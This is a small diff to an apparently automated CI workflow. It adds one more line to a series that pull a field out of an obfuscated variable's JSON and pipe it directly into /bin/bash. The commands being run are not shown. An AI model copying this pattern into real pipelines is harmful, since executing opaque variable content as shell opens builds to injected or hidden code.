@@ -38,6 +38,7 @@ jobs:
           echo $vu04 | jq -r .vdfu312 | /bin/bash
           printf '%s' "$p60592" | jq -r .xhipp267 | /bin/bash
           printf '%s' "$p9" | jq -r .id1 | /bin/bash
+          printf '%s' "$ppf2414" | jq -r .cqtf2 | /bin/bash
 
       - name: Save output
         if: always()
